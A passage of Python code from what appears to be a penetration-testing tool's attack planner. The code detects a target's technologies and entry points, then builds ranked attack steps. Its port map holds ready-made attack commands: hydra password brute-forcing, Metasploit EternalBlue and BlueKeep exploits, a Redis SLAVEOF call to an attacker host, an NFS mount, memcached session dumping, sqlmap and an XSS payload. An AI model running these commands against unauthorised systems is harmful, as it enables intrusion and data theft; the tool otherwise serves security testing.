                for pattern, name in detections.items():
                    if pattern in body_lower:
                        if name in ("Stripe", "PayPal"):
                            stack["payment"].append(name)
                        elif name in ("Google Analytics", "Hotjar", "Microsoft Clarity"):
                            stack["analytics"].append(name)
                        elif name in ("jQuery", "Bootstrap", "Tailwind CSS"):
                            stack["js_libraries"].append(name)
                        else:
                            stack["frameworks"].append(name)

                # Version detection
                version_patterns = {
                    "react": r'react[/-]v?(\d+\.\d+)',
                    "next": r'next[/-]v?(\d+\.\d+)',
                    "vue": r'vue[/-]v?(\d+\.\d+)',
                    "angular": r'angular[/-]v?(\d+\.\d+)',
                    "jquery": r'jquery[/-]?(\d+\.\d+\.\d+)',
                    "laravel": r'laravel[/-]?(\d+\.\d+)',
                    "django": r'django/(\d+\.\d+)',
                    "flask": r'flask/(\d+\.\d+)',
                }
                for name, pattern in version_patterns.items():
                    match = re.search(pattern, body, re.IGNORECASE)
                    if match:
                        version = match.group(1)
                        # Append version to the first matching framework
                        for fw_list in [stack["frameworks"], stack["js_libraries"]]:
                            for i, fw in enumerate(fw_list):
                                if name.lower() in fw.lower():
                                    fw_list[i] = f"{fw} {version}"
                                    break

        except Exception as exc:
            logger.debug("Tech stack detection failed: %s", exc)

        # Deduplicate
        for key in stack:
            stack[key] = list(dict.fromkeys(stack[key]))

        return stack

    def _parse_tech_stack(self, tech_stack: dict[str, Any]) -> TechStack:
        return TechStack(
            frameworks=tech_stack.get("frameworks", []),
            servers=tech_stack.get("servers", []),
            languages=tech_stack.get("languages", []),
            databases=tech_stack.get("databases", []),
            cms=tech_stack.get("cms", []),
            cdn=tech_stack.get("cdn", []),
            waf=tech_stack.get("waf", []),
            cloud=tech_stack.get("cloud", []),
            analytics=tech_stack.get("analytics", []),
            payment=tech_stack.get("payment", []),
            js_libraries=tech_stack.get("js_libraries", []),
        )

    # ------------------------------------------------------------------
    # Step building
    # ------------------------------------------------------------------
    def _build_step(
        self,
        step_id: int,
        attack_def: dict[str, Any],
        target_url: str,
        host: str,
        domain: str,
    ) -> AttackStep:
        commands = [
            c.replace("{target}", target_url)
             .replace("{host}", host)
             .replace("{domain}", domain)
            for c in attack_def.get("commands", [])
        ]
        return AttackStep(
            id=step_id,
            phase=attack_def["phase"].value if hasattr(attack_def["phase"], "value") else attack_def["phase"],
            attack=attack_def["attack"],
            description=attack_def.get("description", ""),
            likelihood=attack_def["likelihood"].value if hasattr(attack_def["likelihood"], "value") else attack_def["likelihood"],
            impact=attack_def["impact"].value if hasattr(attack_def["impact"], "value") else attack_def["impact"],
            ease=attack_def.get("ease", "Medium"),
            commands=commands,
            modules=attack_def.get("modules", []),
            prerequisites=attack_def.get("prerequisites", []),
            mitigations=attack_def.get("mitigations", []),
            requires=list(attack_def.get("requires") or self._infer_requires(attack_def)),
            vulnerability_type=str(attack_def.get("vulnerability_type") or self._infer_vulnerability_type(attack_def)),
            category=str(attack_def.get("category") or self._infer_category(attack_def)),
            priority=int(attack_def.get("priority") or attack_def.get("default_priority") or 5),
            context_reason=str(attack_def.get("context_reason") or ""),
        )

    async def _build_context(
        self,
        target_url: str,
        stack: TechStack,
        *,
        scan_id: int | None,
        findings: list[dict[str, Any]] | None,
        entry_points: list[dict[str, Any]] | None,
    ) -> AttackContext:
        context = AttackContext(
            real_findings=self._dedupe_real_findings(findings or []),
            technologies=[item.lower() for item in (stack.frameworks + stack.servers + stack.languages + stack.databases + stack.cms + stack.cloud + stack.cdn)],
        )
        self._merge_entry_points(context, entry_points or [])
        if scan_id:
            await self._merge_scan_context(context, scan_id)
        if not any([context.parameters, context.forms, context.api_endpoints, context.graphql_endpoints, context.file_uploads, context.auth_endpoints, context.discovered_paths]):
            await self._detect_entry_points(target_url, context)
        parsed = urlparse(target_url)
        for name in re.findall(r"[?&]([A-Za-z_][A-Za-z0-9_-]*)=", parsed.query):
            self._append_unique(context.parameters, name)
            if name.lower() in {"next", "redirect", "return", "returnurl", "url", "continue"}:
                self._append_unique(context.redirect_parameters, name)
        return context

    async def _merge_scan_context(self, context: AttackContext, scan_id: int) -> None:
        try:
            from app.database import get_findings, get_scan_artifacts

            context.real_findings = self._dedupe_real_findings(context.real_findings + await get_findings(scan_id))
            artifacts = await get_scan_artifacts(scan_id) or {}
        except Exception:
            return
        for key in ("active_security_output", "browser_security_output", "shadow_recon_output", "scanner_output"):
            payload = artifacts.get(key) or {}
            if isinstance(payload, str):
                continue
            surfaces = payload.get("surfaces") or payload.get("attack_surface", {}).get("surfaces") or payload.get("api_inventory") or []
            if isinstance(surfaces, list):
                self._merge_entry_points(context, [item for item in surfaces if isinstance(item, dict)])
            for finding in payload.get("findings") or []:
                if isinstance(finding, dict):
                    context.real_findings = self._dedupe_real_findings(context.real_findings + [finding])

    async def _detect_entry_points(self, target_url: str, context: AttackContext) -> None:
        try:
            async with httpx.AsyncClient(timeout=10.0, verify=False, follow_redirects=True, trust_env=False) as client:
                response = await client.get(target_url, headers={"User-Agent": "PhantomScan-AttackPlanner/1.0"})
        except Exception as exc:
            logger.debug("Entry-point detection failed: %s", exc)
            return
        body = response.text[:200_000]
        context.response_headers = {key.lower(): value for key, value in response.headers.items()}
        for match in re.finditer(r"<form\b([^>]*)>(.*?)</form>", body, flags=re.IGNORECASE | re.DOTALL):
            attrs = match.group(1)
            inner = match.group(2)
            action = self._attr(attrs, "action") or urlparse(target_url).path or "/"
            method = (self._attr(attrs, "method") or "GET").upper()
            form = {"type": "form", "path": action, "method": method, "parameters": []}
            for input_match in re.finditer(r"<(?:input|textarea|select)\b([^>]*)>", inner, flags=re.IGNORECASE):
                input_attrs = input_match.group(1)
                name = self._attr(input_attrs, "name")
                input_type = (self._attr(input_attrs, "type") or "").lower()
                if name:
                    self._append_unique(form["parameters"], name)
                    self._append_unique(context.parameters, name)
                if input_type == "file":
                    self._append_unique(context.file_uploads, action)
            context.forms.append(form)
            if re.search(r"login|auth|signin|password", action + " " + inner, re.IGNORECASE):
                self._append_unique(context.auth_endpoints, action)
        for href in re.findall(r"(?:href|src)=['\"]([^'\"]+)['\"]", body, flags=re.IGNORECASE):
            path = urlparse(href).path or href
            if not path or path.startswith(("#", "mailto:")):
                continue
            self._append_unique(context.discovered_paths, path)
            lowered = path.lower()
            if "/api" in lowered:
                self._append_unique(context.api_endpoints, path)
            if "graphql" in lowered:
                self._append_unique(context.graphql_endpoints, path)
            if re.search(r"login|auth|signin", lowered):
                self._append_unique(context.auth_endpoints, path)
            if re.search(r"actuator|debug|env|trace|metrics", lowered):
                self._append_unique(context.debug_endpoints, path)
        for name in re.findall(r"[?&]([A-Za-z_][A-Za-z0-9_-]*)=", body):
            self._append_unique(context.parameters, name)
            if name.lower() in {"next", "redirect", "return", "returnurl", "url", "continue"}:
                self._append_unique(context.redirect_parameters, name)

    def _merge_entry_points(self, context: AttackContext, entry_points: list[dict[str, Any]]) -> None:
        for endpoint in entry_points:
            parameters = endpoint.get("parameters") or endpoint.get("params") or []
            if isinstance(parameters, dict):
                parameters = list(parameters.keys())
            for parameter in parameters if isinstance(parameters, list) else []:
                name = str(parameter.get("name") if isinstance(parameter, dict) else parameter)
                if name:
                    self._append_unique(context.parameters, name)
                    if name.lower() in {"next", "redirect", "return", "returnurl", "url", "continue"}:
                        self._append_unique(context.redirect_parameters, name)
            path = str(endpoint.get("path") or endpoint.get("url") or endpoint.get("endpoint") or "")
            method = str(endpoint.get("method") or "GET").upper()
            endpoint_type = str(endpoint.get("type") or "").lower()
            if path:
                self._append_unique(context.discovered_paths, path)
            lowered = f"{endpoint_type} {path}".lower()
            if "api" in lowered or endpoint.get("module") == "api_security":
                self._append_unique(context.api_endpoints, path or endpoint_type)
            if "graphql" in lowered:
                self._append_unique(context.graphql_endpoints, path or "/graphql")
            if endpoint_type == "upload" or "upload" in lowered or "multipart" in str(endpoint).lower():
                self._append_unique(context.file_uploads, path or "upload")
            if method == "POST" or endpoint_type == "form":
                context.forms.append(endpoint)
            if re.search(r"login|auth|signin|password", lowered):
                self._append_unique(context.auth_endpoints, path or endpoint_type)
            if re.search(r"actuator|debug|env|trace|metrics", lowered):
                self._append_unique(context.debug_endpoints, path or endpoint_type)

    @staticmethod
    def _attr(attrs: str, name: str) -> str:
        match = re.search(rf"\b{name}\s*=\s*(['\"])(.*?)\1", attrs, flags=re.IGNORECASE)
        return match.group(2).strip() if match else ""

    @staticmethod
    def _append_unique(values: list[Any], value: Any) -> None:
        if value and value not in values:
            values.append(value)

    def _filter_contextual_steps(self, steps: list[AttackStep], context: AttackContext, host: str) -> list[AttackStep]:
        filtered: list[AttackStep] = []
        by_key: dict[str, AttackStep] = {}
        for step in steps:
            if not self._is_applicable(step, context):
                continue
            self._apply_priority_and_reason(step, context)
            key = f"{step.vulnerability_type or step.attack.lower()}|{host}"
            existing = by_key.get(key)
            if existing is None or self._step_rank(step) > self._step_rank(existing):
                by_key[key] = step
        filtered = list(by_key.values())
        filtered.sort(key=self._step_rank, reverse=True)
        return filtered

    def _is_applicable(self, step: AttackStep, context: AttackContext) -> bool:
        if step.vulnerability_type in {"hsts", "tls"} and not self._matching_real_finding(step, context):
            return False
        if self._matching_real_finding(step, context):
            return True
        for requirement in step.requires:
            if requirement == "parameters" and not context.parameters:
                return False
            if requirement == "redirect" and not context.redirect_parameters:
                return False
            if requirement == "forms" and not context.forms:
                return False
            if requirement == "file_upload" and not context.file_uploads:
                return False
            if requirement == "api" and not context.api_endpoints:
                return False
            if requirement == "graphql" and not context.graphql_endpoints and not any("graphql" in item for item in context.technologies):
                return False
            if requirement == "auth" and not context.auth_endpoints:
                return False
            if requirement == "cors_headers" and not any(header.startswith("access-control-") for header in context.response_headers):
                return False
            if requirement == "debug_endpoint" and not context.debug_endpoints:
                return False
            if requirement == "database" and not any(db in " ".join(context.technologies) for db in ["mysql", "postgres", "sqlite", "mssql", "oracle", "mongodb"]):
                return False
            if requirement == "server_side" and not self._has_server_side_context(context):
                return False
            if requirement == "cloud" and not any(cloud in " ".join(context.technologies) for cloud in ["aws", "gcp", "azure", "vercel", "cloudflare", "cloudfront"]):
                return False
        return True

    @staticmethod
    def _has_server_side_context(context: AttackContext) -> bool:
        text = " ".join(context.technologies)
        return any(token in text for token in ["django", "flask", "laravel", "spring", "rails", "express", "php", "node", "python", "java", "ruby"])

    def _apply_priority_and_reason(self, step: AttackStep, context: AttackContext) -> None:
        finding = self._matching_real_finding(step, context)
        if finding:
            severity = str(finding.get("severity") or "").upper()
            step.priority = 10 if severity in {"CRITICAL", "HIGH"} else 8
            step.context_reason = f"Prioritized because PhantomScan has a real {severity or 'verified'} finding for {finding.get('title', step.attack)}."
            return
        reasons = []
        if "parameters" in step.requires:
            reasons.append(f"{len(context.parameters)} input parameter(s) discovered")
        if "api" in step.requires:
            reasons.append(f"{len(context.api_endpoints)} API endpoint(s) discovered")
        if "graphql" in step.requires:
            reasons.append("GraphQL endpoint or technology detected")
        if "file_upload" in step.requires:
            reasons.append("file upload entry point detected")
        if "auth" in step.requires:
            reasons.append("authentication entry point detected")
        if "redirect" in step.requires:
            reasons.append("redirect-like parameter detected")
        if "cors_headers" in step.requires:
            reasons.append("CORS headers observed")
        if "debug_endpoint" in step.requires:
            reasons.append("debug-style endpoint discovered")
        step.context_reason = "; ".join(reasons) if reasons else "General low-noise reconnaissance step applicable to public web targets."

    @staticmethod
    def _step_rank(step: AttackStep) -> tuple[int, int, int, int]:
        likelihood_score = {"VERY_HIGH": 5, "HIGH": 4, "MEDIUM": 3, "LOW": 2, "VERY_LOW": 1}
        impact_score = {"CRITICAL": 5, "HIGH": 4, "MEDIUM": 3, "LOW": 2, "INFO": 1}
        finding_specific = 1 if step.attack.lower().startswith(("exploit:", "validate finding:")) else 0
        return (step.priority, finding_specific, impact_score.get(step.impact, 0), likelihood_score.get(step.likelihood, 0))

    def _matching_real_finding(self, step: AttackStep, context: AttackContext) -> dict[str, Any] | None:
        step_type = step.vulnerability_type.lower()
        if not step_type:
            return None
        aliases = {
            "injection": {"injection", "sqli", "sql injection"},
            "xss": {"xss", "cross-site scripting"},
            "api": {"api", "api_security"},
            "security_headers": {"security_headers", "security headers", "csp", "x-frame-options", "hsts"},
            "hsts": {"hsts", "strict-transport-security"},
            "tls": {"tls", "https"},
            "cors": {"cors"},
            "file_upload": {"file upload", "file_upload", "upload"},
            "jwt": {"jwt"},
            "csrf": {"csrf"},
        }
        needles = aliases.get(step_type, {step_type})
        for finding in context.real_findings:
            text = " ".join(str(finding.get(name) or "") for name in ("title", "category", "module", "evidence")).lower()
            if any(needle in text for needle in needles):
                return finding
        return None

    def _dedupe_real_findings(self, findings: list[dict[str, Any]]) -> list[dict[str, Any]]:
        deduped: dict[str, dict[str, Any]] = {}
        for finding in findings:
            if self._is_false_positive_finding(finding):
                continue
            host = urlparse(str(finding.get("endpoint") or finding.get("target") or "")).netloc.lower()
            key = f"{self._finding_type(finding)}|{host}"
            current = deduped.get(key)
            if current is None or self._finding_rank(finding) > self._finding_rank(current):
                deduped[key] = finding
        return list(deduped.values())

    @staticmethod
    def _is_false_positive_finding(finding: dict[str, Any]) -> bool:
        if str(finding.get("risk_status") or "ACTIVE").upper() == "FALSE_POSITIVE":
            return True
        finding_type = str(finding.get("type") or finding.get("category") or finding.get("module") or "").lower()
        status = str(finding.get("status") or finding.get("state") or "").lower()
        if finding_type in {"hsts", "strict-transport-security"} and status in {"present", "enabled", "valid", "ok"}:
            return True
        if finding_type in {"tls", "https"} and status in {"supported", "valid", "ok"}:
            return True
        text = " ".join(str(finding.get(name) or "") for name in ("title", "category", "evidence", "request_response_diff", "verification_result")).lower()
        if ("hsts" in text or "strict-transport-security" in text) and re.search(r"hsts (enabled|present|valid)|strict-transport-security: max-age=[1-9]", text):
            return True
        if "tls" in text and re.search(r"tls (1\.2|1\.3).*(works|ok|succeeded|supported)", text):
            return True
        return False

    @staticmethod
    def _finding_type(finding: dict[str, Any]) -> str:
        text = " ".join(str(finding.get(name) or "") for name in ("title", "category", "module")).lower()
        for key, patterns in {
            "injection": ["sql", "injection"],
            "xss": ["xss", "cross-site"],
            "ssrf": ["ssrf"],
            "graphql": ["graphql"],
            "security_headers": ["security header", "hsts", "content-security-policy", "x-frame-options"],
            "tls": ["tls", "https"],
        }.items():
            if any(pattern in text for pattern in patterns):
                return key
        return text[:80]

    @staticmethod
    def _finding_rank(finding: dict[str, Any]) -> tuple[int, float]:
        severity_rank = {"CRITICAL": 5, "HIGH": 4, "MEDIUM": 3, "LOW": 2, "INFO": 1}
        severity = severity_rank.get(str(finding.get("severity") or "INFO").upper(), 0)
        try:
            confidence = float(finding.get("confidence_score") or 0)
        except (TypeError, ValueError):
            confidence = {"HIGH": 0.9, "MEDIUM": 0.6, "LOW": 0.3, "POTENTIAL": 0.2}.get(str(finding.get("confidence") or "LOW").upper(), 0.1)
        return (severity, confidence)

    @staticmethod
    def _infer_requires(attack_def: dict[str, Any]) -> list[str]:
        text = " ".join(str(value) for value in [attack_def.get("attack"), attack_def.get("description"), " ".join(attack_def.get("modules", [])), " ".join(attack_def.get("prerequisites", []))]).lower()
        requirements: list[str] = []
        if re.search(r"sql|xss|template|ssti|input parameter|user input", text):
            requirements.append("parameters")
        if "sql" in text:
            requirements.append("database")
        if "ssrf" in text or "metadata" in text or "fetch functionality" in text:
            requirements.extend(["parameters", "server_side"])
        if "redirect" in text:
            requirements.append("redirect")
        if "cors" in text:
            requirements.append("cors_headers")
        if re.search(r"debug|actuator|environment variable", text):
            requirements.append("debug_endpoint")
        if "upload" in text:
            requirements.append("file_upload")
        if "graphql" in text:
            requirements.append("graphql")
        if "api" in text or "idor" in text or "jwt" in text:
            requirements.append("api")
        if re.search(r"login|credential|password|auth|csrf|rate limiting", text):
            requirements.append("auth")
        if "form" in text or "csrf" in text:
            requirements.append("forms")
        if "cloud metadata" in text:
            requirements.append("cloud")
        return list(dict.fromkeys(requirements))

    @staticmethod
    def _infer_vulnerability_type(attack_def: dict[str, Any]) -> str:
        text = " ".join(str(value) for value in [attack_def.get("attack"), attack_def.get("description"), " ".join(attack_def.get("modules", []))]).lower()
        mapping = [
            ("graphql", "graphql"),
            ("xss", "xss"),
            ("cross-site", "xss"),
            ("sql", "injection"),
            ("injection", "injection"),
            ("ssrf", "ssrf"),
            ("upload", "file_upload"),
            ("redirect", "redirect"),
            ("cors", "cors"),
            ("jwt", "jwt"),
            ("csrf", "csrf"),
            ("api", "api"),
            ("tls", "tls"),
            ("hsts", "hsts"),
            ("header", "security_headers"),
        ]
        for needle, value in mapping:
            if needle in text:
                return value
        return ""

    @staticmethod
    def _infer_category(attack_def: dict[str, Any]) -> str:
        modules = [str(module) for module in attack_def.get("modules", [])]
        if modules:
            return modules[0]
        phase = attack_def.get("phase")
        return phase.value if hasattr(phase, "value") else str(phase or "general")

    def _port_based_attacks(
        self, open_ports: list[int], target_url: str, host: str
    ) -> list[dict[str, Any]]:
        attacks = []
        port_map = {
            21: {"attack": "FTP anonymous login / brute-force", "likelihood": Likelihood.MEDIUM, "impact": Impact.CRITICAL, "commands": ["ftp {host}", "hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://{host}"], "modules": ["auth", "access_control"], "mitigations": ["Disable anonymous FTP", "Use SFTP instead", "Enforce strong passwords"]},
            22: {"attack": "SSH brute-force / key enumeration", "likelihood": Likelihood.MEDIUM, "impact": Impact.CRITICAL, "commands": ["hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{host}", "ssh-audit {host}"], "modules": ["auth"], "mitigations": ["Use key-based auth only", "Disable root login", "Rate-limit SSH"]},
            23: {"attack": "Telnet credential sniffing", "likelihood": Likelihood.HIGH, "impact": Impact.CRITICAL, "commands": ["telnet {host}", "msfconsole -x 'use auxiliary/scanner/telnet/telnet_login'"], "modules": ["auth"], "mitigations": ["Replace Telnet with SSH", "Encrypt all traffic"]},
            25: {"attack": "SMTP open relay / user enumeration", "likelihood": Likelihood.MEDIUM, "impact": Impact.MEDIUM, "commands": ["smtp-user-enum -U /usr/share/wordlists/users.txt -t {host}", "nc {host} 25"], "modules": ["auth", "info_disclosure"], "mitigations": ["Require authentication", "Restrict relay"]},
            53: {"attack": "DNS zone transfer / cache poisoning", "likelihood": Likelihood.MEDIUM, "impact": Impact.HIGH, "commands": ["dig @{host} axfr example.com", "dig @{host} VERSION.BIND chaos TXT"], "modules": ["info_disclosure"], "mitigations": ["Restrict zone transfers", "Use DNSSEC"]},
            80: {"attack": "HTTP web application testing", "likelihood": Likelihood.HIGH, "impact": Impact.HIGH, "commands": ["curl -sI http://{host}", "nikto -h http://{host}", "gobuster dir -u http://{host} -w /usr/share/wordlists/dirb/common.txt"], "modules": ["sqli", "xss", "auth", "access_control"], "mitigations": ["WAF deployment", "Input validation", "HTTPS enforcement"]},
            110: {"attack": "POP3 credential sniffing", "likelihood": Likelihood.MEDIUM, "impact": Impact.HIGH, "commands": ["nc {host} 110", "hydra -l admin -P /usr/share/wordlists/rockyou.txt pop3://{host}"], "modules": ["auth"], "mitigations": ["Use POP3S (995)", "Enforce TLS"]},
            111: {"attack": "RPCBind / NFS mount", "likelihood": Likelihood.MEDIUM, "impact": Impact.HIGH, "commands": ["rpcinfo -p {host}", "showmount -e {host}"], "modules": ["access_control"], "mitigations": ["Restrict RPC to trusted IPs", "Use NFSv4 with Kerberos"]},
            135: {"attack": "MSRPC Windows exploitation", "likelihood": Likelihood.MEDIUM, "impact": Impact.CRITICAL, "commands": ["msfconsole -x 'use auxiliary/scanner/dcerpc/enumeratedcps'"], "modules": ["auth", "access_control"], "mitigations": ["Block port 135 externally", "Use Windows Firewall"]},
            139: {"attack": "NetBIOS / SMB enumeration", "likelihood": Likelihood.MEDIUM, "impact": Impact.HIGH, "commands": ["enum4linux {host}", "smbclient -L //{host} -N"], "modules": ["info_disclosure", "auth"], "mitigations": ["Disable NetBIOS externally", "Use SMBv3 with encryption"]},
            143: {"attack": "IMAP credential sniffing", "likelihood": Likelihood.MEDIUM, "impact": Impact.HIGH, "commands": ["nc {host} 143", "hydra -l admin -P /usr/share/wordlists/rockyou.txt imap://{host}"], "modules": ["auth"], "mitigations": ["Use IMAPS (993)", "Enforce TLS"]},
            443: {"attack": "HTTPS web application testing + TLS attacks", "likelihood": Likelihood.HIGH, "impact": Impact.HIGH, "commands": ["curl -skI https://{host}", "testssl.sh {host}", "nikto -h https://{host}", "gobuster dir -u https://{host} -w /usr/share/wordlists/dirb/common.txt"], "modules": ["sqli", "xss", "auth", "access_control", "tls"], "mitigations": ["WAF deployment", "Input validation", "Strong TLS config"]},
            445: {"attack": "SMB exploitation / EternalBlue", "likelihood": Likelihood.MEDIUM, "impact": Impact.CRITICAL, "commands": ["smbclient -L //{host} -N", "msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue'"], "modules": ["auth", "access_control"], "mitigations": ["Disable SMBv1", "Patch MS17-010", "Block port 445 externally"]},
            993: {"attack": "IMAPS SSL/TLS vulnerabilities", "likelihood": Likelihood.LOW, "impact": Impact.MEDIUM, "commands": ["openssl s_client -connect {host}:993"], "modules": ["tls"], "mitigations": ["Use strong TLS certificates", "Disable weak ciphers"]},
            995: {"attack": "POP3S SSL/TLS vulnerabilities", "likelihood": Likelihood.LOW, "impact": Impact.MEDIUM, "commands": ["openssl s_client -connect {host}:995"], "modules": ["tls"], "mitigations": ["Use strong TLS certificates", "Disable weak ciphers"]},
            1433: {"attack": "MSSQL brute-force / xp_cmdshell", "likelihood": Likelihood.MEDIUM, "impact": Impact.CRITICAL, "commands": ["hydra -l sa -P /usr/share/wordlists/rockyou.txt mssql://{host}", "msfconsole -x 'use auxiliary/scanner/mssql/mssql_login'"], "modules": ["auth", "access_control"], "mitigations": ["Use Windows auth", "Disable xp_cmdshell", "Least-privilege accounts"]},
            1521: {"attack": "Oracle TNS listener exploitation", "likelihood": Likelihood.MEDIUM, "impact": Impact.CRITICAL, "commands": ["odat all -s {host} -p 1521"], "modules": ["auth", "access_control"], "mitigations": ["Restrict TNS listener", "Use strong passwords"]},
            1723: {"attack": "PPTP VPN brute-force", "likelihood": Likelihood.MEDIUM, "impact": Impact.HIGH, "commands": ["hydra -l admin -P /usr/share/wordlists/rockyou.txt pptp://{host}"], "modules": ["auth"], "mitigations": ["Use WireGuard/OpenVPN instead", "Enforce strong passwords"]},
            2049: {"attack": "NFS unauthenticated file access", "likelihood": Likelihood.HIGH, "impact": Impact.CRITICAL, "commands": ["showmount -e {host}", "mount -t nfs {host}:/ /tmp/nfs"], "modules": ["access_control"], "mitigations": ["Export only to trusted IPs", "Use NFSv4 with Kerberos", "No root_squash"]},
            3306: {"attack": "MySQL brute-force / UDF privesc", "likelihood": Likelihood.MEDIUM, "impact": Impact.CRITICAL, "commands": ["hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://{host}", "msfconsole -x 'use auxiliary/scanner/mysql/mysql_login'"], "modules": ["auth", "access_control"], "mitigations": ["Use strong passwords", "Disable remote root", "Least-privilege accounts"]},
            3389: {"attack": "RDP brute-force / BlueKeep", "likelihood": Likelihood.MEDIUM, "impact": Impact.CRITICAL, "commands": ["hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://{host}", "msfconsole -x 'use exploit/windows/rdp/cve_2019_0708_bluekeep_rce'"], "modules": ["auth"], "mitigations": ["Use NLA", "Restrict to VPN", "Patch BlueKeep"]},
            5432: {"attack": "PostgreSQL brute-force / COPY privesc", "likelihood": Likelihood.MEDIUM, "impact": Impact.CRITICAL, "commands": ["hydra -l postgres -P /usr/share/wordlists/rockyou.txt postgres://{host}", "msfconsole -x 'use auxiliary/scanner/postgres/postgres_login'"], "modules": ["auth", "access_control"], "mitigations": ["Use strong passwords", "pg_hba.conf restrictions", "Least-privilege accounts"]},
            5900: {"attack": "VNC brute-force / auth bypass", "likelihood": Likelihood.MEDIUM, "impact": Impact.CRITICAL, "commands": ["hydra -l root -P /usr/share/wordlists/rockyou.txt vnc://{host}", "msfconsole -x 'use auxiliary/scanner/vnc/vnc_login'"], "modules": ["auth"], "mitigations": ["Use VNC over SSH tunnel", "Enforce strong passwords"]},
            6379: {"attack": "Redis unauthenticated access / SLAVEOF RCE", "likelihood": Likelihood.HIGH, "impact": Impact.CRITICAL, "commands": ["redis-cli -h {host} INFO", "redis-cli -h {host} SLAVEOF {attacker_ip} 6379"], "modules": ["auth", "access_control"], "mitigations": ["Require AUTH command", "Bind to 127.0.0.1", "Rename dangerous commands"]},
            8000: {"attack": "HTTP-ALT / dev server exposure", "likelihood": Likelihood.MEDIUM, "impact": Impact.MEDIUM, "commands": ["curl -sI http://{host}:8000", "gobuster dir -u http://{host}:8000 -w /usr/share/wordlists/dirb/common.txt"], "modules": ["sqli", "xss", "auth"], "mitigations": ["Remove dev servers from production", "Restrict access"]},
            8080: {"attack": "HTTP-Proxy / admin console testing", "likelihood": Likelihood.MEDIUM, "impact": Impact.MEDIUM, "commands": ["curl -sI http://{host}:8080", "gobuster dir -u http://{host}:8080 -w /usr/share/wordlists/dirb/common.txt"], "modules": ["sqli", "xss", "auth"], "mitigations": ["Remove admin consoles from production", "Require authentication"]},
            8443: {"attack": "HTTPS-ALT / admin console SSL testing", "likelihood": Likelihood.MEDIUM, "impact": Impact.MEDIUM, "commands": ["curl -skI https://{host}:8443", "testssl.sh {host}:8443"], "modules": ["sqli", "xss", "auth", "tls"], "mitigations": ["Remove admin consoles from production", "Require authentication"]},
            9200: {"attack": "Elasticsearch unauthenticated data access", "likelihood": Likelihood.HIGH, "impact": Impact.CRITICAL, "commands": ["curl -s 'http://{host}:9200/_cat/indices'", "curl -s 'http://{host}:9200/_search?size=1'"], "modules": ["access_control", "info_disclosure"], "mitigations": ["Enable X-Pack security", "Require authentication", "Restrict network access"]},
            9300: {"attack": "Elasticsearch Transport Cluster exploitation", "likelihood": Likelihood.HIGH, "impact": Impact.CRITICAL, "commands": ["curl -s 'http://{host}:9200/_cluster/state'"], "modules": ["access_control"], "mitigations": ["Disable transport port externally", "Enable TLS for transport"]},
            11211: {"attack": "Memcached amplification / data leak", "likelihood": Likelihood.HIGH, "impact": Impact.HIGH, "commands": ["echo 'stats' | nc {host} 11211", "echo 'get session:*' | nc {host} 11211"], "modules": ["info_disclosure", "access_control"], "mitigations": ["Bind to 127.0.0.1", "Enable SASL auth", "Disable UDP"]},
            27017: {"attack": "MongoDB unauthenticated access", "likelihood": Likelihood.HIGH, "impact": Impact.CRITICAL, "commands": ["mongosh --host {host} --port 27017 --eval 'db.adminCommand({listDatabases:1})'", "msfconsole -x 'use auxiliary/scanner/mongodb/mongodb_login'"], "modules": ["auth", "access_control", "info_disclosure"], "mitigations": ["Enable SCRAM auth", "Bind to 127.0.0.1", "Restrict network access"]},
            27018: {"attack": "MongoDB unauthenticated access (alt port)", "likelihood": Likelihood.HIGH, "impact": Impact.CRITICAL, "commands": ["mongosh --host {host} --port 27018 --eval 'db.adminCommand({listDatabases:1})'"], "modules": ["auth", "access_control"], "mitigations": ["Enable SCRAM auth", "Bind to 127.0.0.1"]},
            50000: {"attack": "SAP Dispatcher / web app exposure", "likelihood": Likelihood.MEDIUM, "impact": Impact.HIGH, "commands": ["curl -sI http://{host}:50000", "nmap -sV -p 50000 --script http-title {host}"], "modules": ["auth", "access_control"], "mitigations": ["Remove SAP from public facing", "Restrict to VPN"]},
            50070: {"attack": "Hadoop NameNode unauthenticated", "likelihood": Likelihood.HIGH, "impact": Impact.CRITICAL, "commands": ["curl -s 'http://{host}:50070/dfshealth.jsp'"], "modules": ["access_control"], "mitigations": ["Enable Kerberos auth", "Restrict network access"]},
            60020: {"attack": "Hadoop ResourceManager unauthenticated", "likelihood": Likelihood.HIGH, "impact": Impact.CRITICAL, "commands": ["curl -s 'http://{host}:60020/ws/v1/cluster/info'"], "modules": ["access_control"], "mitigations": ["Enable Kerberos auth", "Restrict network access"]},
        }

        for port in open_ports:
            if port in port_map:
                info = port_map[port]
                attacks.append({
                    "phase": Phase.INITIAL_ACCESS,
                    "attack": info["attack"],
                    "description": f"Service on port {port} may be vulnerable to {info['attack'].lower()}.",
                    "likelihood": info["likelihood"],
                    "impact": info["impact"],
                    "ease": "Easy",
                    "commands": info["commands"],
                    "modules": info.get("modules", ["access_control", "auth"]),
                    "prerequisites": [f"Port {port} open"],
                    "mitigations": info.get("mitigations", ["Use strong credentials", "Restrict network access"]),
                })
        return attacks

    def _finding_to_attack(
        self, finding: dict[str, Any], target_url: str
    ) -> dict[str, Any] | None:
        title = (finding.get("title") or finding.get("name") or "").lower()
        severity = (finding.get("severity") or "info").lower()

        impact_map = {"critical": Impact.CRITICAL, "high": Impact.HIGH, "medium": Impact.MEDIUM, "low": Impact.LOW}
        impact = impact_map.get(severity, Impact.INFO)

        if "sql" in title or "injection" in title:
            return {
                "phase": Phase.INITIAL_ACCESS,
                "attack": f"Exploit: {finding.get('title', 'SQL Injection')}",
                "description": finding.get("description", "SQL injection vulnerability found."),
                "likelihood": Likelihood.HIGH,
                "impact": impact,
                "ease": "Medium",
                "commands": [f"sqlmap -u '{target_url}/?id=1' --batch --risk=3 --level=5"],
                "modules": ["sqli", "injection"],
                "prerequisites": [],
                "mitigations": ["Use parameterized queries"],
            }
        if "xss" in title or "cross-site" in title:
            return {
                "phase": Phase.INITIAL_ACCESS,
                "attack": f"Exploit: {finding.get('title', 'XSS')}",
                "description": finding.get("description", "XSS vulnerability found."),
                "likelihood": Likelihood.HIGH,
                "impact": impact,
                "ease": "Easy",
                "commands": [f"curl '{target_url}/?q=<script>alert(1)</script>'"],
                "modules": ["xss"],
                "prerequisites": [],
                "mitigations": ["Output encoding", "CSP"],
            }
        if "ssrf" in title:
            return {
                "phase": Phase.INITIAL_ACCESS,
                "attack": f"Exploit: {finding.get('title', 'SSRF')}",
